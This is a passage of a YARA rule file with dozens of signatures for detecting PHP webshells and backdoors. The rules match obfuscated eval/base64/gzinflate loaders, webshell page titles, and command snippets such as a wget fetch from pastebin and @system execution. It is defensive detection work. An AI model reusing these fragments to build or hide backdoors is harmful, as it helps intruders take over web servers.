        $trigger = "eval(gzinflate(base64_decode('7f1pe+M2sjAMf5/rmv/AVjxpO5a1Wd5jJ1pt2dYueevu10OJlERroUxS65z+728VFhJctL"
    condition:
        $trigger
}

rule php_backdoor_webshell_109 : backdoor
{
    strings:
        $trigger = "eval(gzinflate(base64_decode('7f1pe+JIsjCAfp55nvkPKsbTtscusxhv5ba7xQ5mxxhDdV0fgYSQEQhL7HPq/vYbkZmSUg"
    condition:
        $trigger
}

private rule PR03477 : trigger
{
    strings:
        $ps0 = "7P37ehq58igM/73zPLkHhWENMLE5+RAfgicYsI3j"
    condition:
        $ps0
}

rule php_backdoor_webshell_110 : backdoor
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR00029 and PR03477
}

rule php_backdoor_webshell_111 : backdoor
{
    strings:
        $trigger = "eval(gzinflate(base64_decode('FJ3HbuNQm23n/SL9AxwwJ6BxG8xBzJmcNJhzznz66wJqZFgu6pzz7b0WJVv/+//+53+XZv"
    condition:
        $trigger
}

private rule PR03478 : trigger
{
    strings:
        $ps0 = "SyvNSy7JzM9TCHaJKEkK1VApyk/KL9GshtC26VWZeWk5iSWpGkmJxalmJvEpqcn5KakaRY"
    condition:
        $ps0
}

rule php_backdoor_webshell_112 : backdoor
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR00029 and PR03478
}

rule php_backdoor_webshell_113 : backdoor
{
    strings:
        $trigger = "eval(gzinflate(base64_decode('FJ3HcqTaEkU/53UEA3wBQ7z3nskLPIX"
    condition:
        $trigger
}

private rule PR03479 : trigger
{
    strings:
        $ps0 = "ZXJyb3JfcmVwb3J0aW5nKDcpOwpAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApOwpvYl9zdGFydCgpOwokbXRpbWUgICAgI"
    condition:
        $ps0
}

rule php_backdoor_webshell_114 : backdoor
{
    strings:
        $trigger = "ZXZ"
    condition:
        $trigger and PR03479
}

rule php_backdoor_webshell_115 : backdoor
{
    strings:
        $trigger = "<title>.: Shell Killers :."
    condition:
        $trigger
}

rule php_backdoor_webshell_116 : backdoor
{
    strings:
        $trigger = "SSI Web Shell "
    condition:
        $trigger
}

rule php_backdoor_webshell_117 : backdoor
{
    strings:
        $trigger = "Coded By Mustafa Moshkela ~ Lions Of Iraq Team"
    condition:
        $trigger and PR00013
}

rule php_backdoor_webshell_118 : backdoor
{
    strings:
        $trigger = "<title>r0b0t ShEll"
    condition:
        $trigger
}

rule php_backdoor_webshell_119 : backdoor
{
    strings:
        $trigger = "<title>DX ajax text shell (ATS)"
    condition:
        $trigger
}

rule php_backdoor_webshell_120 : backdoor
{
    strings:
        $trigger = "<title>***TuiTui*** SHELL"
    condition:
        $trigger
}

rule php_backdoor_webshell_121 : backdoor
{
    strings:
        $trigger = "<title>.:+: ShellAngkangan"
    condition:
        $trigger
}

rule php_backdoor_webshell_122 : backdoor
{
    strings:
        $trigger = "-Ani Shell-"
    condition:
        $trigger
}

rule php_backdoor_webshell_123 : backdoor
{
    strings:
        $trigger = "<title>Peterson - Shell"
    condition:
        $trigger
}

rule php_backdoor_webshell_124 : backdoor
{
    strings:
        $trigger = "<title>Back Connect Shell -- PHP"
    condition:
        $trigger
}

rule php_backdoor_webshell_125 : backdoor
{
    strings:
        $trigger = "<title>Cy#b3r00T Shell Uploader"
    condition:
        $trigger
}

rule php_backdoor_webshell_126 : backdoor
{
    strings:
        $trigger = "<title>Proxyshell hide ip"
    condition:
        $trigger
}

rule php_backdoor_webshell_127 : backdoor
{
    strings:
        $trigger = "<title>PBT - PHPshell BY TINKLE<"
    condition:
        $trigger
}

rule php_backdoor_webshell_128 : backdoor
{
    strings:
        $trigger = "coded By JIKO for all Hackers"
    condition:
        $trigger and PR00013
}

rule php_backdoor_webshell_129 : backdoor
{
    strings:
        $trigger = "~ Shell I</title>"
    condition:
        $trigger and PR00042
}

rule php_backdoor_webshell_130 : backdoor
{
    strings:
        $trigger = "<title>Pwned By Monkey"
    condition:
        $trigger
}

rule php_backdoor_webshell_131 : backdoor
{
    strings:
        $trigger = "ZWNobyAnPGh0bWw+PGhlYWQ+PHRpdGxlPicuZ2V0ZW52KCJIVFRQX0hPU1QiKS4nI"
    condition:
        $trigger and PR00029 and PR01422
}

private rule PR03480 : trigger
{
    strings:
        $ps0 = "echo 'Zip Created, bhaens"
    condition:
        $ps0
}

rule php_backdoor_webshell_132 : backdoor
{
    strings:
        $trigger = "= getcwd()"
    condition:
        $trigger and PR03480 and PR02394
}

private rule PR03481 : trigger
{
    strings:
        $ps0 = "<textarea id='evalcode'"
    condition:
        $ps0
}

rule php_backdoor_webshell_133 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR00355 and PR01392 and PR03481 and PR00357
}

rule php_backdoor_webshell_134 : backdoor
{
    strings:
        $trigger = "private function createDir($path, $chmod = 0777,"
    condition:
        $trigger and PR00435
}

private rule PR03482 : trigger
{
    strings:
        $ps0 = "echo \"MySQL: $mysql | Perl: $perl | Python: $python"
    condition:
        $ps0
}

private rule PR03483 : trigger
{
    strings:
        $ps0 = "echo \"Upload File:"
    condition:
        $ps0
}

rule php_backdoor_webshell_135 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR03482 and PR00355 and PR01392 and PR03483 and PR00357
}

private rule PR03484 : trigger
{
    strings:
        $ps0 = "NoMXJzNXQ"
    condition:
        $ps0
}

rule php_backdoor_webshell_136 : backdoor
{
    strings:
        $trigger = "$_F=__FILE__;$_X='Pz48P3BocA0K"
    condition:
        $trigger and PR03484 and PR01479
}

private rule PR03485 : trigger
{
    strings:
        $ps0 = "private $ctrl_dir = array();"
    condition:
        $ps0
}

rule php_backdoor_webshell_137 : backdoor
{
    strings:
        $trigger = "function editfile($file)"
    condition:
        $trigger and PR00013 and PR03485
}

private rule PR03486 : trigger
{
    strings:
        $ps0 = "$shelltext=(\"uname -a\");"
    condition:
        $ps0
}

rule php_backdoor_webshell_139 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR00355 and PR01392 and PR03486 and PR00357
}

// MANUAL FIX NECESSARY
rule php_backdoor_webshell_140 : backdoor
{
    strings:
        $trigger = "urldecode('%66%67%36%73%62%65%68%70%72%61%34%63%6f%5f%74%6e%64"
        $php_backdoor_webshell_140_r0 = /<\?php[\s]*\/\*[\s]*[Cc][Oo][Dd][Ee3][Dd]/
    condition:
        $trigger and PR00029 and $php_backdoor_webshell_140_r0
}

private rule PR03487 : trigger
{
    strings:
        $ps0 = "<body onload=\"SetFocus('cmd')\">"
    condition:
        $ps0
}

private rule PR03488 : trigger
{
    strings:
        $ps0 = "echo 'Done!';"
    condition:
        $ps0
}

rule php_backdoor_webshell_141 : backdoor
{
    strings:
        $trigger = "exec"
    condition:
        $trigger and PR03487 and PR03488
}

rule php_backdoor_webshell_142 : backdoor
{
    strings:
        $trigger = "7X39d9o6EujP2XP2f1C97DXcEgKk7W1DSJrvkKZJ"
    condition:
        $trigger and PR00029 and PR01422
}

rule php_backdoor_webshell_143 : backdoor
{
    strings:
        $trigger = "{if(empty($input))return;$keyStr = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\";$chr1 = $chr2 = $chr3 = \"\";"
    condition:
        $trigger and PR01818
}

// MANUAL FIX NECESSARY
private rule PR03489 : trigger
{
    strings:
        $ps0 = "};eval($"
    condition:
        $ps0
}

rule php_backdoor_webshell_144 : backdoor
{
    strings:
        $trigger = "ZXZhbCgnPz4nLi"
        $php_backdoor_webshell_144_r0 = /\$[0O]{4,}[\s]*=[\s]*base64_decode\(.[\w]{30,}.\);[\s]*\$[0O]{4,}/
    condition:
        $trigger and PR03489 and PR01422 and $php_backdoor_webshell_144_r0
}

// MANUAL FIX NECESSARY
rule php_backdoor_webshell_145 : backdoor
{
    strings:
        $trigger = "\\x"
        $php_backdoor_webshell_145_r0 = /function [\w]+\((\$[\w]+,[\s]*){2,}\$[\w]+\)[\s]*\{[\s]*return[\s]*(\$[\w]+\.[\s]*){2,}\$[\w]+;[\s]*\}[\s]*\$[\w]+[\s]*=/
    condition:
        $trigger and PR01851 and $php_backdoor_webshell_145_r0
}

rule php_backdoor_webshell_146 : backdoor
{
    strings:
        $trigger = "echo \"<font color=red>Directory Not Deleted!</font><br>\";"
    condition:
        $trigger and PR00039
}

private rule PR03490 : trigger
{
    strings:
        $ps0 = "$exec=exec('wget http://pastebin"
    condition:
        $ps0
}

rule php_backdoor_webshell_147 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR00507 and PR02987 and PR03490 and PR02988
}

private rule PR03491 : trigger
{
    strings:
        $ps0 = "header(\"HTTP/1.0 404 Not Found\")"
    condition:
        $ps0
}

private rule PR03492 : trigger
{
    strings:
        $ps0 = "@system($code); $output = ob_get_contents(); ob_end_clean();"
    condition:
        $ps0
}

rule php_backdoor_webshell_149 : backdoor
{
    strings:
        $trigger = "exec"
    condition:
        $trigger and PR00013 and PR03491 and PR03492
}

rule php_backdoor_webshell_150 : backdoor
{
    strings:
        $trigger = "WebShellOrb"
    condition:
        $trigger and PR01398
}

rule php_backdoor_webshell_151 : backdoor
{
    strings:
        $trigger = "\"hidden_shell_version\" => \"#"
    condition:
        $trigger
}

private rule PR03493 : trigger
{
    strings:
        $ps0 = "$nav = get_nav(get_cwd());"
    condition:
        $ps0
}

rule php_backdoor_webshell_152 : backdoor
{
    strings:
        $trigger = "exec"
    condition:
        $trigger and PR03493 and PR00013 and PR01021
}

rule php_backdoor_webshell_153 : backdoor
{
    strings:
        $trigger = "cmR3cmFwKCRzdHIpIHsNCiAgICAkc3RyID0gQH"
    condition:
        $trigger and PR01398
}

private rule PR03494 : trigger
{
    strings:
        $ps0 = "\"safe_mode = OFF"
    condition:
        $ps0
}

private rule PR03495 : trigger
{
    strings:
        $ps0 = "foreach($configuration"
    condition:
        $ps0
}

rule php_backdoor_webshell_154 : backdoor
{
    strings:
        $trigger = "fopen('php.ini','w');"
    condition:
        $trigger and PR00013 and PR03494 and PR03495
}

private rule PR03496 : trigger
{
    strings:
        $ps0 = "saveOneShell($shell_base_dir,$type)"
    condition:
        $ps0
}

private rule PR03497 : trigger
{
    strings:
        $ps0 = "function processHtaccess($base_dir)"
    condition:
        $ps0
}

rule php_backdoor_webshell_155 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR03496 and PR01021 and PR03497
}

rule php_backdoor_webshell_156 : backdoor
{
    strings:
        $trigger = "define('SELF_PATH_TO_UNLINK', __FILE__);"
    condition:
        $trigger and PR01436 and PR00029 and PR02667 and PR02499
}

// MANUAL FIX NECESSARY
rule php_backdoor_webshell_157 : backdoor
{
    strings:
        $trigger = "base64_decode"
        $php_backdoor_webshell_157_r0 = /@eval\(\"[^\"]+\"[\s]*\.[\s]*base64_decode\(\"[^;]{5000}/
    condition:
        $trigger and PR00029 and $php_backdoor_webshell_157_r0
}

private rule PR03498 : trigger
{
    strings:
        $ps0 = "eyJjIjoiY3JlYXRlX2Z1bmN0aW9uIiwicCI6IiR4IiwiYSI6IkBldmFsKFwi"
    condition:
        $ps0
}

rule php_backdoor_webshell_158 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR03498 and PR01479
}

rule php_backdoor_webshell_159 : backdoor
{
    strings:
        $trigger = "(gzinflate(base64_decode(str_rot13(\"7Y17qlWUm"
    condition:
        $trigger and PR00029
}

private rule PR03499 : trigger
{
    strings:
        $ps0 = "$test($none, '}'.$"
    condition:
        $ps0
}

rule php_backdoor_webshell_160 : backdoor
{
    strings:
        $trigger = "),\"\".chr("
    condition:
        $trigger and PR03499
}

rule php_backdoor_webshell_161 : backdoor
{
    strings:
        $trigger = "P29wdGlvbiZwYXRoPSRwYXRoJm9wdD1jaG1vZCZ0eXBlPWRpciZuYW"
    condition:
        $trigger and PR01398
}

private rule PR03500 : trigger
{
    strings:
        $ps0 = "SPECIMENT MINI SHELL"
    condition:
        $ps0
}

rule php_backdoor_webshell_162 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR00355 and PR03500 and PR01392 and PR00357
}

private rule PR03501 : trigger
{
    strings:
        $ps0 = "echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');"
    condition:
        $ps0
}

rule php_backdoor_webshell_163 : backdoor
{
    strings:
        $trigger = "fopen"
    condition:
        $trigger and PR00355 and PR03501
}

rule php_backdoor_webshell_164 : backdoor
{
    strings:
        $trigger = "function r_action_removeshell() { if (file_exists"
    condition:
        $trigger and PR01350 and PR01431
}

rule php_backdoor_webshell_166 : backdoor
{
    strings:
        $trigger = "x6ck\\x64G\\x67\\x36I\\x47F\\x31d\\x47\\x38\\x37\\x49\\x6a"
    condition:
        $trigger and PR00029 and PR01422
}

private rule PR03502 : trigger
{
    strings:
        $ps0 = "function Evil($x,$y=false)"
    condition:
        $ps0
}

private rule PR03503 : trigger
{
    strings:
        $ps0 = "function Execute($x)"
    condition:
        $ps0
}

rule php_backdoor_webshell_167 : backdoor
{
    strings:
        $trigger = "exit;"
    condition:
        $trigger and PR00039 and PR02056 and PR03502 and PR03503
}

private rule PR03504 : trigger
{
    strings:
        $ps0 = "+eWP8R2kvcuL+eWPYtjXvDuOsde4YtJF7KX=="
    condition:
        $ps0
}

rule php_backdoor_webshell_168 : backdoor
{
    strings:
        $trigger = "urldecode('%66%67%36%73%62%65%68%70%72%61%34%63%6f%5f%74%6e%64"
    condition:
        $trigger and PR03504 and PR00029
}

private rule PR03505 : trigger
{
    strings:
        $ps0 = "UGVybWlzc2lvbiA6IDxpbnB1dCBuYW1lPSJwZXJtIiB0eXBlPSJ0ZXh0IiBzaXplPSI0IiB2YWx1ZT0iJy5zdWJzdHIoc3ByaW"
    condition:
        $ps0
}

rule php_backdoor_webshell_169 : backdoor
{
    strings:
        $trigger = ">"
    condition:
        $trigger and PR03505 and PR02951
}

private rule PR03506 : trigger
{
    strings:
        $ps0 = "QRUO3FGSBtkSFRWTUBjSCRlROJmSzIEajNTTuh1UB"
    condition:
        $ps0
}

rule php_backdoor_webshell_170 : backdoor
{
    strings:
        $trigger = "base64_decod"
    condition:
        $trigger and PR03506
}

private rule PR03507 : trigger
{
    strings:
        $ps0 = "7X1bcxw3luaz9SvSZbaLHPEuyXbzZpdI2patm0XKbltiM7I"
    condition:
        $ps0
}

rule php_backdoor_webshell_171 : backdoor
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR00029 and PR03507
}

private rule PR03508 : trigger
{
    strings:
        $ps0 = "function writAble($dir, $perm)"
    condition:
        $ps0
}

rule php_backdoor_webshell_172 : backdoor
{
    strings:
        $trigger = "function makeRequest($url, $post = null, $head = null)"
    condition:
        $trigger and PR00039 and PR03508
}

rule php_backdoor_webshell_173 : backdoor
{
    strings:
        $trigger = "base64_decode($jembot)"
    condition:
        $trigger and PR00029
}

private rule PR03509 : trigger
{
    strings:
        $ps0 = "DQplcnJvcl9yZXBvcnRpbmcoNyk7DQpAc2V0X21hZ2ljX3F1b3Rlc19ydW5"
    condition:
        $ps0
}

rule php_backdoor_webshell_174 : backdoor
{
    strings:
        $trigger = "eva"
    condition:
        $trigger and PR03509
}

rule php_backdoor_webshell_175 : backdoor
{
    strings:
        $trigger = "Pz48P3BocA0KJDNybCA9ICghNW1wdHkoJF9TRVJ"
    condition:
        $trigger and PR01419
}

rule php_backdoor_webshell_176 : backdoor
{
    strings:
        $trigger = ": 'phpinfo();';?>\" style="
    condition:
        $trigger and PR00039 and PR02056
}

private rule PR03510 : trigger
{
    strings:
        $ps0 = "7Ux6Zts2Ev58nvF/S7O6Q5pNouz6TZ8iqo09"
    condition:
        $ps0
}

rule php_backdoor_webshell_177 : backdoor
{
    strings:
        $trigger = "str_rot13"
    condition:
        $trigger and PR02538 and PR01422 and PR03510
}

rule php_backdoor_webshell_178 : backdoor
{
    strings:
        $trigger = "Unknowndevice64"
    condition:
        $trigger and PR00029
}

private rule PR03511 : trigger
{
    strings:
        $ps0 = "7Vvrc9pIEv9OqvI/TCbeCLIGAcaPNQifg3Hiil9lO7eVMi5K"
    condition:
        $ps0
}

rule php_backdoor_webshell_179 : backdoor
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR03511 and PR00029
}

private rule PR03512 : trigger
{
    strings:
        $ps0 = "define('shellname"
    condition:
        $ps0
}

private rule PR03513 : trigger
{
    strings:
        $ps0 = "define('root_dir"
    condition:
        $ps0
}

rule php_backdoor_webshell_180 : backdoor
{
    strings:
        $trigger = "exit;"
    condition:
        $trigger and PR00039 and PR02056 and PR03512 and PR03513
}

private rule PR03514 : trigger
{
    strings:
        $ps0 = "PD9waHANCmlmKGVtcHR5KCRfQ09PS0lFWydteXBhc3MnXSkpICRfQ09PS0lFWydt"
    condition:
        $ps0
}

rule php_backdoor_webshell_181 : backdoor
{
    strings:
        $trigger = "urldecode("
    condition:
        $trigger and PR00029 and PR03514
}

private rule PR03515 : trigger
{
    strings:
        $ps0 = "fputs($brute_save, date(\"d.m.y H:i:s\").\"|HOST:"
    condition:
        $ps0
}

rule php_backdoor_webshell_182 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR00355 and PR01392 and PR00357 and PR03515
}

private rule PR03516 : trigger
{
    strings:
        $ps0 = "1X37W9tG0+jveZ78DxvXX2Q3xmAubWojAwXScJo"
    condition:
        $ps0
}

rule php_backdoor_webshell_183 : backdoor
{
    strings:
        $trigger = ".chr"
    condition:
        $trigger and PR03516
}

private rule PR03517 : trigger
{
    strings:
        $ps0 = "header(\"Content-Type:"
    condition:
        $ps0
}

private rule PR03518 : trigger
{
    strings:
        $ps0 = "->extractTo(uhex($_GET"
    condition:
        $ps0
}

rule php_backdoor_webshell_184 : backdoor
{
    strings:
        $trigger = "header(\"Location:"
    condition:
        $trigger and PR00265 and PR03517 and PR01021 and PR03518 and PR01341
}

private rule PR03519 : trigger
{
    strings:
        $ps0 = "function upload($upfile,$ndir,$unzip,$delzip) {"
    condition:
        $ps0
}

rule php_backdoor_webshell_185 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR03519
}

private rule PR03520 : trigger
{
    strings:
        $ps0 = "$command = (exe('whoami')) ? \"ON\" : \"OFF\";"
    condition:
        $ps0
}

rule php_backdoor_webshell_186 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR02027 and PR03520
}

private rule PR03521 : trigger
{
    strings:
        $ps0 = "$body=(\"Shell: http"
    condition:
        $ps0
}

rule php_backdoor_webshell_187 : backdoor
{
    strings:
        $trigger = "disable_functions"
    condition:
        $trigger and PR01403 and PR03521 and PR02639
}

rule php_backdoor_webshell_188 : backdoor
{
    strings:
        $trigger = "U2hlbGwgQmFja2Rvb3I"
    condition:
        $trigger and PR01398
}

rule php_backdoor_webshell_189 : backdoor
{
    strings:
        $trigger = "eval('?>'.base64_decode($thanks));"
    condition:
        $trigger
}

rule php_backdoor_webshell_190 : backdoor
{
    strings:
        $trigger = ")));eval(returnmal(getmal($_"
    condition:
        $trigger and PR01398
}

rule php_backdoor_webshell_191 : backdoor
{
    strings:
        $trigger = "<a href=\"admin.php?op=massaddcommands\">"
    condition:
        $trigger and PR00203 and PR00205
}

private rule PR03522 : trigger
{
    strings:
        $ps0 = "CR2vRGkXO2wiIny7FcfO0WOhVkNt62J6Ehxq54dgMgBBr0F0iA"
    condition:
        $ps0
}

rule php_backdoor_webshell_192 : backdoor
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR00029 and PR03522
}

// MANUAL FIX NECESSARY
private rule PR03523 : trigger
{
    strings:
        $ps0 = "function charCode($"
    condition:
        $ps0
}

rule php_backdoor_webshell_193 : backdoor
{
    strings:
        $trigger = "].$"
        $php_backdoor_webshell_193_r0 = /\$[\w]+\[[\d]+\]+[\s]*\.[\s]*\$[\w]+\[[\d]+\][\s]*\.[\s]*\$[\w]+\[[\d]+\][\s]*\./
        $php_backdoor_webshell_193_r1 = /\];return [eE][vV][aA][lL]\(\$/
    condition:
        $trigger and PR03523 and $php_backdoor_webshell_193_r0 and $php_backdoor_webshell_193_r1
}

rule php_backdoor_webshell_194 : backdoor
{
    strings:
        $trigger = "$url=base64_decode(\"aHR0cHM6Ly9wYXN0ZWJpbi5j"
    condition:
        $trigger and PR00029
}

// MANUAL FIX NECESSARY
rule php_backdoor_webshell_195 : backdoor
{
    strings:
        $trigger = "gzinflate(base64_decode("
        $php_backdoor_webshell_195_r0 = /\"[\w]{32}\";[^\n]+[\s]*function [\w]+[^\{]+\{[\s]*\$[\w]+[\s]*=[\s]*gzinflate\(base64_decode/
    condition:
        $trigger and PR00029 and $php_backdoor_webshell_195_r0
}

private rule PR03524 : trigger
{
    strings:
        $ps0 = "header(\"content-Type: text/html; charset=utf-8\");"
    condition:
        $ps0
}

private rule PR03525 : trigger
{
    strings:
        $ps0 = "$password ="
    condition:
        $ps0
}

rule php_backdoor_webshell_196 : backdoor
{
    strings:
        $trigger = "str_rot13($str)"
    condition:
        $trigger and PR03524 and PR03525
}

// MANUAL FIX NECESSARY
rule php_backdoor_webshell_197 : backdoor
{
    strings:
        $trigger = "));$"
        $php_backdoor_webshell_197_r0 = /<\?php[\s]*\$[\w]+[\s]*=[\s]*\"[^\"]+\";[^(]*function [\w]+\(\$[\w]+,[\s]*\$[\w]+,[\s]*\$[\w]+\)[\s]*\{[\s]*return[^;]+''[^;]+;[\s]*\}[\s]*\$[\w]+[\s]*=[\s]*[\w]+\(\$[\w]+[^\n]+array\(..,.\}.\.\$[\w]+\..\/\/.\)\);[\s]*(\?>)?/
    condition:
        $trigger and PR02354 and $php_backdoor_webshell_197_r0
}

rule php_backdoor_webshell_198 : backdoor
{
    strings:
        $trigger = "ZDNkM0xqUnVaMlZzTG01bGRB"
    condition:
        $trigger and PR01398
}

rule php_backdoor_webshell_199 : backdoor
{
    strings:
        $trigger = "if(any(\"x\",$_REQUEST)&&$_REQUEST['x']==\"scan-port\")"
    condition:
        $trigger and PR00039 and PR02056 and PR03502 and PR01788
}

rule php_backdoor_webshell_200 : backdoor
{
    strings:
        $trigger = "VoMp3IZN9wp6/kB0JAdHKnYaL9bcggs0ec0SWzTQrf/drykECkZjGHnDuqTlNuW/j4eIiRzKFUESjU9/8B"
    condition:
        $trigger and PR01398
}

rule php_backdoor_webshell_201 : backdoor
{
    strings:
        $trigger = "U2lkIEdpZmFya"
    condition:
        $trigger and PR01398
}

private rule PR03526 : trigger
{
    strings:
        $ps0 = "<a title=\"Delete\" href=\"?p=<?php echo urlencode("
    condition:
        $ps0
}

private rule PR03527 : trigger
{
    strings:
        $ps0 = "<a title=\"Open direct link\" href=\"<?php echo"
    condition:
        $ps0
}

rule php_backdoor_webshell_202 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR03526 and PR01428 and PR03527
}

private rule PR03528 : trigger
{
    strings:
        $ps0 = "<title><?php echo $_SERVER["
    condition:
        $ps0
}

rule php_backdoor_webshell_203 : backdoor
{
    strings:
        $trigger = "function l__"
    condition:
        $trigger and PR01545 and PR03528 and PR01479
}

private rule PR03529 : trigger
{
    strings:
        $ps0 = "dJvHjsNKlqYfoJ6iFg3MLRANeoeaWtB77zkYDOhFb0Q"
    condition:
        $ps0
}

rule php_backdoor_webshell_205 : backdoor
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR00029 and PR03529
}

private rule PR03530 : trigger
{
    strings:
        $ps0 = "sprintf(\"<span class='%s' >%s</span>\", count($firewall) < 1 ? \"ok\" : \"error\", count"
    condition:
        $ps0
}

rule php_backdoor_webshell_206 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01428 and PR01021 and PR03530
}

private rule PR03531 : trigger
{
    strings:
        $ps0 = "&zero_act=upload"
    condition:
        $ps0
}

private rule PR03532 : trigger
{
    strings:
        $ps0 = "(zeroCommand('wget"
    condition:
        $ps0
}

rule php_backdoor_webshell_207 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01468 and PR01534 and PR03531 and PR03532
}

rule php_backdoor_webshell_208 : backdoor
{
    strings:
        $trigger = "spufingDomain\" => isset($_POST[\"spufingDomain"
    condition:
        $trigger and PR00435
}

private rule PR03533 : trigger
{
    strings:
        $ps0 = "7b1sWyLJszD6t/08/R1Fxt+UnklJZHroTgVqFEdcuvtrq6qrChF4A"
    condition:
        $ps0
}

rule php_backdoor_webshell_209 : backdoor
{
    strings:
        $trigger = "str_rot13(gzinflate(str_rot13(base64_decode(($"
    condition:
        $trigger and PR03533
}

private rule PR03534 : trigger
{
    strings:
        $ps0 = "AnarchoXploit"
    condition:
        $ps0
}

rule php_backdoor_webshell_210 : backdoor
{
    strings:
        $trigger = "exec"
    condition:
        $trigger and PR00013 and PR01021 and PR03534
}

// MANUAL FIX NECESSARY
private rule PR03535 : trigger
{
    strings:
        $ps0 = "\"\\x67\\x7a\\x69\\x6e\\x66\\x6c\\x61\\x74\\x65\";"
    condition:
        $ps0
}

private rule PR03536 : trigger
{
    strings:
        $ps0 = "\"\\x72\\x61\\x77\\x75\\x72\\x6c\\x64\\x65\\x63\\x6f\\x64\\x65\";"
    condition:
        $ps0
}

private rule PR03537 : trigger
{
    strings:
        $ps0 = "\"\\x62\\x61\\x73\\x65\\66\\x34\\x5f\\144\\145\\x63\\157\\144\\x65\";"
    condition:
        $ps0
}

rule php_backdoor_webshell_211 : backdoor
{
    strings:
        $trigger = "\";eval("
        $php_backdoor_webshell_211_r0 = /\$[\w]+[\s]*=[\s]*\".x...x...x...x...x[^;]+;[\s]*\$[\w]+[\s]*=[\s]*\".x...x...x...x[^\(]+eval\([^\)]+[\)\s]+;/
    condition:
        $trigger and PR03535 and PR03536 and PR03537 and $php_backdoor_webshell_211_r0
}

// MANUAL FIX NECESSARY
private rule PR03538 : trigger
{
    strings:
        $ps0 = "'#"
    condition:
        $ps0
}

private rule PR03539 : trigger
{
    strings:
        $ps0 = "parse_str"
    condition:
        $ps0
}

rule php_backdoor_webshell_212 : backdoor
{
    strings:
        $trigger = "*/./*"
        $php_backdoor_webshell_212_r0 = /<\?[^\x02]{0,300}parse_str[\s]*(#|\/\/|\/\*)/
    condition:
        $trigger and PR03538 and PR03539 and $php_backdoor_webshell_212_r0
}

private rule PR03540 : trigger
{
    strings:
        $ps0 = "// WHO SHELL"
    condition:
        $ps0
}

rule php_backdoor_webshell_213 : backdoor
{
    strings:
        $trigger = "base64_decode"
    condition:
        $trigger and PR03540 and PR00029
}

rule php_backdoor_webshell_214 : backdoor
{
    strings:
        $trigger = "(\\$[\\w]+[\\s]*=[\\s]*base64_decode\\([^\\)]+\\);[\\s]*){3,}eval\\([^;]+\\);"
    condition:
        $trigger
}

private rule PR03541 : trigger
{
    strings:
        $ps0 = ":echo json_encode($"
    condition:
        $ps0
}

private rule PR03542 : trigger
{
    strings:
        $ps0 = "array();goto"
    condition:
        $ps0
}

rule php_backdoor_webshell_215 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01468 and PR01469 and PR03541 and PR03542
}

private rule PR03543 : trigger
{
    strings:
        $ps0 = "function isCopy(cp){"
    condition:
        $ps0
}

rule php_backdoor_webshell_216 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR03543 and PR01648 and PR01021 and PR02769
}

private rule PR03544 : trigger
{
    strings:
        $ps0 = "7Vrrc9s2Ev+czOR/QFldIF308iOpI4tq"
    condition:
        $ps0
}

rule php_backdoor_webshell_217 : backdoor
{
    strings:
        $trigger = "0O"
    condition:
        $trigger and PR03544 and PR00029 and PR01422
}

rule php_backdoor_webshell_218 : backdoor
{
    strings:
        $trigger = "aWYoZ2V0X21hZ2ljX3F1b3Rlc19ncGMoKSl7DQpmb3JlYWN"
    condition:
        $trigger and PR01398
}

private rule PR03545 : trigger
{
    strings:
        $ps0 = "ZnVuY3Rpb24gX0hmQlAoJF9JWGt0ZUZF"
    condition:
        $ps0
}

rule php_backdoor_webshell_219 : backdoor
{
    strings:
        $trigger = "eval(base64_decode"
    condition:
        $trigger and PR03545
}

rule php_backdoor_webshell_220 : backdoor
{
    strings:
        $trigger = "ZnVuY3Rpb24gX1pYaDkoJF9NRnBGYyl7JF9NRnBGYz1zd"
    condition:
        $trigger and PR01398
}

private rule PR03546 : trigger
{
    strings:
        $ps0 = "$_F=__FILE__;$_X='Pz48P3BocA0KNXJyMn"
    condition:
        $ps0
}

rule php_backdoor_webshell_221 : backdoor
{
    strings:
        $trigger = "XH"
    condition:
        $trigger and PR03546
}

rule php_backdoor_webshell_222 : backdoor
{
    strings:
        $trigger = "ZnVuY3Rpb24gX0kwQ0ooJF8yZHF0OFMpeyR"
    condition:
        $trigger and PR01398
}

private rule PR03547 : trigger
{
    strings:
        $ps0 = "(chmod(zeroPath()"
    condition:
        $ps0
}

private rule PR03548 : trigger
{
    strings:
        $ps0 = "zero_act=upload"
    condition:
        $ps0
}

rule php_backdoor_webshell_223 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01468 and PR03547 and PR03548
}

private rule PR03549 : trigger
{
    strings:
        $ps0 = "if(preg_match('#([ ]{200,}if\\(file_exists\\(\\'.+?\\'\\)\\) require_once\\(\\'.+?\\'\\);)#si',$"
    condition:
        $ps0
}

rule php_backdoor_webshell_224 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR03549 and PR01431
}

rule php_backdoor_webshell_225 : backdoor
{
    strings:
        $trigger = "* Description: Simple WordPress Shell -"
